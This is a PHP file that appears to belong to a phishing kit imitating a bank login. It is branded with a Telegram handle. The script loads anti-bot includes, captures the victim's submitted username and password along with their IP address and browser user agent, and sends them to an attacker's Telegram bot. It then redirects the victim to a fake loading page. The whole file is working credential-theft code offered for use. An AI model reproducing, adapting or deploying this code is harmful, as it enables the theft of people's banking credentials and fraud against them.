<?php

/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ https://t.me/BAK34_TMW
                                                                                              
*/
session_start();

include "../anti/anti1.php";
include "../anti/anti2.php";
include "../anti/anti3.php";
include "../anti/anti4.php";
include "../anti/anti5.php";
include "../anti/anti6.php";
include "../anti/anti7.php";

// Store username (burger-id or email) in session
$_SESSION['username'] = $_POST['username'];



include '../bak3r.php';

$messages = "ㅤㅤㅤ[🔥] 𝑷𝒖𝒏𝒌𝒕𝒖𝒎 𝕭𝖞 @BAK34_TMW [🔥]ㅤㅤㅤㅤ\n\n";
$messages .= "💌𝖀𝖘𝖊𝖗: " . $_POST['username'] . "\n";
$messages .= "🗝𝓟𝖆𝖘𝖘𝖜𝖔𝖗𝖉: " . $_POST['password'] . "\n\n";
$messages .= "🗑𝓐𝓭𝓻𝓮𝓼𝓼𝓮 𝓘𝓟 : " . $_SERVER['REMOTE_ADDR'] . "\n🛒𝑼𝒔𝒆𝒓 𝑨𝒈𝒆𝒏𝒕 : " . $_SERVER['HTTP_USER_AGENT'] . "";



$data = array(
    'chat_id' => $chatid,
    'text' => $messages
);

$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    )
);

$context = stream_context_create($options);
$result = file_get_contents("https://api.telegram.org/bot$token/sendMessage", false, $context);


header("Location: ../loadiing.php");